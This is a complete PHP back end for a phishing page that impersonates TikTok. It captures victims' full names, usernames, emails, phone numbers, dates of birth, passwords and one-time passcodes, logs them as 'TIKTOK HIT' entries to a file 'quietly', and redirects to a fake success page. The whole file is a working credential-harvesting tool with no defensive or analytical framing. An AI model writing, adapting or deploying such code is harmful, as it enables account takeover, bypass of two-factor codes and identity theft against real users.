<?php
date_default_timezone_set("Africa/Lagos"); // or your timezone

// Collect submitted data
$fullname = $_POST['fullname'] ?? 'N/A';
$username = $_POST['username'] ?? 'N/A';
$email = $_POST['email'] ?? 'N/A';
$phone = $_POST['phone'] ?? 'N/A';
$dob = $_POST['dob'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';
$otp = $_POST['otp'] ?? 'N/A';

// Structure the log
$log = "=========== TIKTOK HIT ===========\n";
$log .= "Full Name: $fullname\n";
$log .= "Username: $username\n";
$log .= "Email: $email\n";
$log .= "Phone: $phone\n";
$log .= "DOB: $dob\n";
$log .= "Password: $password\n";
$log .= "OTP: $otp\n";
$log .= "Time: " . date("Y-m-d H:i:s") . "\n";
$log .= "==================================\n\n";

// Save logs quietly
file_put_contents("creator_data.log", $log, FILE_APPEND);

// Optional: redirect to fake success page
header("Location: success.html");
exit();
?>
